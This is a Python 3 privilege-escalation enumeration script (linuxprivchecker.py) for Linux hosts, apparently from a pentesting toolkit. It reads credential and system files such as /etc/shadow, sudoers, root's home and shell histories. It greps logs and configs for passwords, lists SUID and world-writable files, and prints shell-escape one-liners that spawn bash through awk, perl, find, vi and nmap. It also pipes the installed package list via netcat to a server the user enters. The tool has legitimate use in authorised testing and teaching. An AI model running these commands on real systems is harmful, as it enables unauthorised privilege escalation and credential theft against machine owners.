#!/usr/bin/env python3

###############################################################################################################
## [Title]: linuxprivchecker.py -- a Linux Privilege Escalation Check Script for python 3
## [Author]: Mike Czumak (T_v3rn1x) -- @SecuritySift
## [Updater]: Mike Merrill (linted)
##-------------------------------------------------------------------------------------------------------------
## [Details]: 
## This script is intended to be executed locally on a Linux box to enumerate basic system info and 
## search for common privilege escalation vectors such as world writable files, misconfigurations, clear-text
## passwords and applicable exploits. 
##-------------------------------------------------------------------------------------------------------------
## [Warning]:
## This script comes as-is with no promise of functionality or accuracy.  
##-------------------------------------------------------------------------------------------------------------   
## [Modification, Distribution, and Attribution]:
## You are free to modify and/or distribute this script as you wish.  I only ask that you maintain original
## author attribution and not attempt to sell it or incorporate it into any commercial offering.
###############################################################################################################

# conditional import for older versions of python not compatible with subprocess
from sys import version_info
if version_info >= (3,5):
    #import subprocess as sub
    from subprocess import run, PIPE
    def do_cmd(cmd):
        return run(cmd, stdout=PIPE, stderr=PIPE, shell=True).stdout
elif version_info >= (3,):
    #import os # older version of python, need to use ### instead
    from subprocess import check_output, STDOUT
    def do_cmd(cmd):
        return check_output(cmd, shell=True, stderr=STDOUT)
else:
    print("Error: please run in python3 only.")
    exit(1)

# title / formatting
bigline = "=" * 80
smlline = "-" * 80



def header(message):
    print(bigline)
    print(message)
    print(bigline)
    print("")

# loop through dictionary, execute the commands, store the results, return updated dict
def execCmd(cmdDict):
    for item in cmdDict:
        cmd = cmdDict[item]["cmd"]
        try:
            stdout = do_cmd(cmd)
            results = stdout.decode().split('\n')
        except Exception as e:
            results = ['[-] failed: {}'.format(e)]
        cmdDict[item]["results"]=results
        
    printResults(cmdDict)

# print results for each previously executed command, no return value
def printResults(cmdDict):
    for item in cmdDict:
        msg = cmdDict[item]["msg"]
        results = cmdDict[item]["results"]
        print("[+] " + msg)
        for result in results:
            if result.strip() != "":
                print( "    " + result.strip())
    print("\n")
    return

def writeResults(msg, results):
    f = open("privcheckout.txt", "a")
    f.write("[+] " + str(len(results)-1) + " " + msg)
    for result in results:
        if result.strip() != "":
            f.write("    " + result.strip())
    f.close()
    return

header("LINUX PRIVILEGE ESCALATION CHECKER")

# Basic system info
print( "[*] GETTING BASIC SYSTEM INFO...\n")

sysInfo = {"OS":{"cmd":"cat /etc/issue","msg":"Operating System"}, 
       "KERNEL":{"cmd":"cat /proc/version","msg":"Kernel"}, 
       "HOSTNAME":{"cmd":"hostname", "msg":"Hostname"}
      }

execCmd(sysInfo)

# Networking Info

print( "[*] GETTING NETWORKING INFO...\n")

netInfo = {"NETINFO":{"cmd":"/sbin/ifconfig -a", "msg":"Interfaces"},
       "ROUTE":{"cmd":"route", "msg":"Route"},
       "NETSTAT":{"cmd":"netstat -antup | grep -v 'TIME_WAIT'", "msg":"Netstat"},
       "IP_Adder":{"cmd":"ip addr", "msg":"ip addr"},
       "IP_Route":{"cmd":"ip route", "msg":"ip route"},
       "SS":{"cmd":"ss -antup", "msg":"ss"}
      }

execCmd(netInfo)

# File System Info
print( "[*] GETTING FILESYSTEM INFO...\n")

driveInfo = {"MOUNT":{"cmd":"mount","msg":"Mount results"},
         "FSTAB":{"cmd":"cat /etc/fstab 2>/dev/null", "msg":"fstab entries"}
        }

execCmd(driveInfo)

# Scheduled Cron Jobs
cronInfo = {"CRON":{"cmd":"ls -la /etc/cron* 2>/dev/null", "msg":"Scheduled cron jobs"},
        "CRONW": {"cmd":"ls -aRl /etc/cron* 2>/dev/null | awk '$1 ~ /w.$/' 2>/dev/null", "msg":"Writable cron dirs"}
       }

execCmd(cronInfo)

# User Info
print("\n[*] ENUMERATING USER AND ENVIRONMENTAL INFO...\n")

userInfo = {"WHOAMI":{"cmd":"whoami", "msg":"Current User"},
        "ID":{"cmd":"id","msg":"Current User ID"},
        "ALLUSERS":{"cmd":"cat /etc/passwd", "msg":"All users"},
        "SUPUSERS":{"cmd":"grep -v -E '^#' /etc/passwd | awk -F: '$3 == 0{print $1}'", "msg":"Super Users Found:"},
        "HISTORY":{"cmd":"ls -la ~/.*_history; ls -la /root/.*_history 2>/dev/null", "msg":"Root and current user history (depends on privs)"},
        "ENV":{"cmd":"env 2>/dev/null | grep -v 'LS_COLORS'", "msg":"Environment"},
        "SUDOERS":{"cmd":"cat /etc/sudoers 2>/dev/null | grep -v '#' 2>/dev/null", "msg":"Sudoers (privileged)"},
        "LOGGEDIN":{"cmd":"w 2>/dev/null", "msg":"Logged in User Activity"}
       }

execCmd(userInfo)

if "root" in userInfo["ID"]["results"][0]:
    print("[!] ARE YOU SURE YOU'RE NOT ROOT ALREADY?\n")

# File/Directory Privs
print("[*] ENUMERATING FILE AND DIRECTORY PERMISSIONS/CONTENTS...\n")

fdPerms = {"WWDIRSROOT":{"cmd":"find / \( -type d -perm -o+w \) -exec ls -ld '{}' ';' 2>/dev/null | grep root", "msg":"World Writeable Directories for User/Group 'Root'"},
       "WWDIRS":{"cmd":"find / \( -type d -perm -o+w \) -exec ls -ld '{}' ';' 2>/dev/null | grep -v root", "msg":"World Writeable Directories for Users other than Root"},
       "WWFILES":{"cmd":"find / \( -wholename '/proc/*' -prune \) -o \( -type f -perm -o+w \) -exec ls -l '{}' ';' 2>/dev/null", "msg":"World Writable Files"},
       "SUID":{"cmd":"find / \( -perm -2000 -o -perm -4000 \) -exec ls -ld {} \; 2>/dev/null", "msg":"SUID/SGID Files and Directories"},
       "ROOTHOME":{"cmd":"ls -ahlR /root 2>/dev/null", "msg":"Checking if root's home folder is accessible"}
      }

execCmd(fdPerms)

pwdFiles = {"LOGPWDS":{"cmd":"find /var/log -name '*.log' 2>/dev/null | xargs -l10 egrep 'pwd|password' 2>/dev/null", "msg":"Logs containing keyword 'password'"},
        "CONFPWDS":{"cmd":"find /etc -name '*.c*' 2>/dev/null | xargs -l10 egrep 'pwd|password' 2>/dev/null", "msg":"Config files containing keyword 'password'"},
        "SHADOW":{"cmd":"cat /etc/shadow 2>/dev/null", "msg":"Shadow File (Privileged)"}
       }

execCmd(pwdFiles)

# Processes and Applications
print("[*] ENUMERATING PROCESSES AND APPLICATIONS...\n")

if "debian" in sysInfo["KERNEL"]["results"][0] or "ubuntu" in sysInfo["KERNEL"]["results"][0]:
    getPkgs = "dpkg -l | awk '{$1=$4=\"\"; print $0}'" # debian
else:
    getPkgs = "rpm -qa | sort -u" # RH/other

getAppProc = {"PROCS":{"cmd":"ps aux | awk '{print $1,$2,$9,$10,$11}'", "msg":"Current processes"},
              "PKGS":{"cmd":getPkgs, "msg":"Installed Packages"}}

execCmd(getAppProc)

otherApps = { "SUDO":{"cmd":"sudo -V | grep version 2>/dev/null", "msg":"Sudo Version (Check out http://www.exploit-db.com/search/?action=search&filter_page=1&filter_description=sudo)"},
          "APACHE":{"cmd":"apache2 -v; apache2ctl -M; httpd -v; apachectl -l 2>/dev/null", "msg":"Apache Version and Modules"},
          "APACHECONF":{"cmd":"cat /etc/apache2/apache2.conf 2>/dev/null", "msg":"Apache Config File"}}

execCmd(otherApps)

print("[*] IDENTIFYING PROCESSES AND PACKAGES RUNNING AS ROOT OR OTHER SUPERUSER...\n")

# find the package information for the processes currently running
# under root or another super user

procs = getAppProc["PROCS"]["results"]
pkgs = getAppProc["PKGS"]["results"]
supusers = userInfo["SUPUSERS"]["results"]
procdict = {} # dictionary to hold the processes running as super users
  
for proc in procs: # loop through each process
    relatedpkgs = [] # list to hold the packages related to a process    
    try:
        for user in supusers: # loop through the known super users
            if (user != "") and (user in proc): # if the process is being run by a super user
                procname = proc.split(" ")[4] # grab the process name
            if "/" in procname:
                splitname = procname.split("/")
                procname = splitname[len(splitname)-1]
                for pkg in pkgs: # loop through the packages
                    if not len(procname) < 3: # name too short to get reliable package results
                        if procname in pkg: 
                            if procname in procdict: 
                                relatedpkgs = procdict[proc] # if already in the dict, grab its pkg list
                            if pkg not in relatedpkgs:
                                relatedpkgs.append(pkg) # add pkg to the list
                            procdict[proc]=relatedpkgs # add any found related packages to the process dictionary entry
    except:
        pass

for key in procdict:
    print("    " + key) # print the process name
    try:
        if not procdict[key][0] == "": # only print the rest if related packages were found
            print("        Possible Related Packages: ")
            for entry in procdict[key]: 
                print("            " + entry) # print each related package
    except:
        pass

# EXPLOIT ENUMERATION

# First discover the avaialable tools 
print("\n[*] ENUMERATING INSTALLED LANGUAGES/TOOLS FOR SPLOIT BUILDING...\n")

devTools = {"TOOLS":{"cmd":"which awk perl python ruby gcc cc vi vim nmap find netcat nc wget tftp ftp 2>/dev/null", "msg":"Installed Tools"}}
execCmd(devTools)

print("[+] Related Shell Escape Sequences...\n")

escapeCmd = {"vi":[":!bash", ":set shell=/bin/bash:shell"], 
            "awk":["awk 'BEGIN {system(\"/bin/bash\")}'"], 
            "perl":["perl -e 'exec \"/bin/bash\";'"], 
            "find":["find / -exec /usr/bin/awk 'BEGIN {system(\"/bin/bash\")}' \\;"], 
            "nmap":["--interactive"]}

for cmd in escapeCmd:
    for result in devTools["TOOLS"]["results"]:
        if cmd in result:
            for item in escapeCmd[cmd]:
                print("    " + cmd + "-->\t" + item)
print("[*] FINDING RELEVENT PRIVILEGE ESCALATION EXPLOITS...\n")

question = input("[?] Would you like to search for possible exploits? [y/N] ")
if 'y' in question.lower():
    server = input("[?] What is the address of the server? ")
    port = input("[?] What port is the server using? ")
    print("[ ] Connecting to {}:{}".format(server,port))
    exploits = {"EXPLOITS":{"cmd":"dpkg -l | tail -n +6 | awk '{{print $2, $3}} END {{print \"\"}}' | nc {} {}".format(server, port), "msg":"Found the following possible exploits"}}
    execCmd(exploits)

print("\n[+] Finished")
print(bigline)
